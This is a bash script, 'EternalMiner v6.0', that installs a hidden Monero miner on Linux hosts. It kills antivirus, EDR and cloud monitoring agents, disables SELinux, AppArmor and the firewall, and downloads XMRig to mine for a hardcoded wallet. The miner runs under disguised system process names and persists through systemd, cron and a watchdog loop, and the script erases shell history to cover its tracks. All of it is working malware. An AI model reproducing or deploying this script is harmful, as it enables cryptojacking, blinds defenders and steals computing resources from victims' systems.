
#!/bin/bash
# EternalMiner v6.0 Ultimate - Fully fixed, environment-aware, never-stop mining

WALLET="45pLvfDjyHNLrhd5ekuqZdRUmjkd6ypocYUV8mRaTS5kQGRoWKtUTYg6VpNaCMSmsKWtympm9ruh6Hv55HCuSDXE12NEfwg"
POOL="pool.supportxmr.com:3333"
CPU_LIMIT=75

# Environment check - must be real Linux
if [[ "$(uname)" != "Linux" ]]; then
    exit 0
fi

PROCESS_NAMES=("kworker" "dbus-daemon" "systemd-logind" "rngd" "auditd" "systemd-resolved" "polkitd" "packagekitd")
SERVICE_NAMES=("systemd-update" "dbus-broker" "network-check" "logrotate.timer" "journald-sync" "systemd-timesyncd" "packagekit" "systemd-journal-flush")
RAND=$((RANDOM % 8))
PROCESS_NAME="${PROCESS_NAMES[$RAND]}"
SERVICE_NAME="${SERVICE_NAMES[$RAND]}"
INSTALL_DIR="/tmp/.cache_${PROCESS_NAME}_$(head -c 12 /dev/urandom | xxd -p -c 12)"

echo "[+] Neutralizing interference..."

for tool in clamav freshclam rkhunter chkrootkit crowdstrike falcon ossec aide tripwire fail2ban falco datadog newrelic zabbix prometheus telegraf netdata beats cloudwatch aws ssm azure; do
    pkill -9 -f "$tool" 2>/dev/null || true
done

for svc in apparmor selinux clamav-daemon rkhunter fail2ban ufw firewalld iptables ip6tables systemd-oomd crowdstrike falcon-sensor datadog-agent newrelic-sysmond zabbix-agent prometheus-node-exporter aws-ssm-agent amazon-ssm-agent azure-monitor-agent; do
    systemctl stop $svc 2>/dev/null || true
    systemctl disable $svc 2>/dev/null || true
    systemctl mask $svc 2>/dev/null || true
done

if command -v setenforce >/dev/null 2>&1; then
    setenforce 0 2>/dev/null || true
    mkdir -p /etc/selinux
    echo "SELINUX=disabled" > /etc/selinux/config 2>/dev/null || true
fi

if command -v aa-teardown >/dev/null 2>&1; then
    aa-teardown 2>/dev/null || true
    systemctl stop apparmor 2>/dev/null || true
    systemctl disable apparmor 2>/dev/null || true
fi

mkdir -p /sys/kernel/mm/transparent_hugepage 2>/dev/null || true
echo always > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null || true
echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor >/dev/null 2>&1 || true

mkdir -p /etc/security
cat >> /etc/security/limits.conf <<EOF
* soft nofile 1048576
* hard nofile 1048576
* soft nproc 1048576
* hard nproc 1048576
root soft nofile 1048576
root hard nofile 1048576
EOF 2>/dev/null || true

ulimit -n 1048576 2>/dev/null || true
echo -17 > /proc/$$/oom_adj 2>/dev/null || true

iptables -F 2>/dev/null || true
iptables -P INPUT ACCEPT 2>/dev/null || true
iptables -P OUTPUT ACCEPT 2>/dev/null || true

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Verified download with fallback
ARCH=$(uname -m)
if [[ "$ARCH" == "x86_64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-x86_64.tar.gz -o x.tar.gz || \
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x86_64.tar.gz -o x.tar.gz
elif [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-aarch64.tar.gz -o x.tar.gz || \
    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-aarch64.tar.gz -o x.tar.gz
else
    exit 0
fi

if [ ! -f x.tar.gz ]; then
    exit 0
fi

tar -xzf x.tar.gz --strip-components=1 >/dev/null 2>&1
rm -f x.tar.gz SHA256* *.md LICENSE 2>/dev/null

cat > config.json <<EOF
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": ${CPU_LIMIT},
        "huge-pages": true,
        "hw-aes": true,
        "yield": true,
        "max-cache": 2048
    },
    "opencl": false,
    "cuda": false,
    "pools": [{
        "url": "${POOL}",
        "user": "${WALLET}",
        "pass": "$(hostname | tr -dc '[:alnum:]')",
        "keepalive": true,
        "tls": false
    }],
    "donate-level": 0,
    "print-time": 180,
    "log-file": null,
    "background": true
}
EOF

mv xmrig "$PROCESS_NAME" 2>/dev/null || exit 0

# Systemd if available
if command -v systemctl >/dev/null 2>&1; then
    cat > /etc/systemd/system/${SERVICE_NAME}.service <<EOF
[Unit]
Description=System ${SERVICE_NAME} Manager
After=network.target
[Service]
Type=simple
ExecStart=${INSTALL_DIR}/${PROCESS_NAME}
WorkingDirectory=${INSTALL_DIR}
Restart=always
RestartSec=3
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=best-effort
OOMScoreAdjust=-1000
StandardOutput=null
StandardError=null
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable ${SERVICE_NAME} >/dev/null 2>&1
    systemctl start ${SERVICE_NAME} >/dev/null 2>&1
fi

# Watchdog + fallback persistence
CRON_JOB="*/1 * * * * (${INSTALL_DIR}/${PROCESS_NAME} --config=${INSTALL_DIR}/config.json >/dev/null 2>&1 || true); for s in apparmor selinux fail2ban ufw firewalld systemd-oomd; do systemctl stop \$s 2>/dev/null; systemctl mask \$s 2>/dev/null; done 2>/dev/null"
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    (crontab -l 2>/dev/null; echo "@reboot sleep 10 && ${INSTALL_DIR}/${PROCESS_NAME} --config=${INSTALL_DIR}/config.json") | crontab -
fi

# Self-healing background watcher (works even without cron/systemd)
cat > ${INSTALL_DIR}/watch.sh <<'EOF'
#!/bin/bash
while true; do
    if ! pgrep -f "$1" > /dev/null; then
        $2 --config=$3/config.json >/dev/null 2>&1
    fi
    sleep 15
done
EOF
chmod +x ${INSTALL_DIR}/watch.sh
nohup ${INSTALL_DIR}/watch.sh "${PROCESS_NAME}" "${INSTALL_DIR}/${PROCESS_NAME}" "${INSTALL_DIR}" >/dev/null 2>&1 &

rm -f eternal.sh install.sh 2>/dev/null
history -c && history -w 2>/dev/null

echo "[+] EternalMiner v6.0 deployed on $(hostname)"
echo "[+] Wallet: ${WALLET}"
echo "[+] Process: ${PROCESS_NAME}"
echo "[+] Persistence: Systemd + Cron + Watchdog"

